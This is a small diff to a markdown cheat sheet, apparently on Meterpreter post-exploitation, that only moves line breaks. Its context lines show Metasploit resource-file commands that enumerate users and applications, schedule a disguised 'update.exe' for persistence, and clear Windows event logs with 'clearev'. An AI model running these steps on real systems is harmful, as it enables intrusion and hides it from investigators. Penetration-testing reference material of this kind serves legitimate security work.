@@ -106,8 +106,8 @@
         echo 'run post/windows/gather/enum_logged_on_users' >> my_resource_file.rc
         echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
 
+<br />
      `[run]` meterpreter > resource /root/my_resource_file.rc
-
 <br />
 
 - **FFF**
@@ -123,8 +123,8 @@
         echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> my_resource_file.rc
         clearev
 
+<br />
      `[run]` meterpreter > resource /root/my_resource_file.rc
-
 <br />
 
 
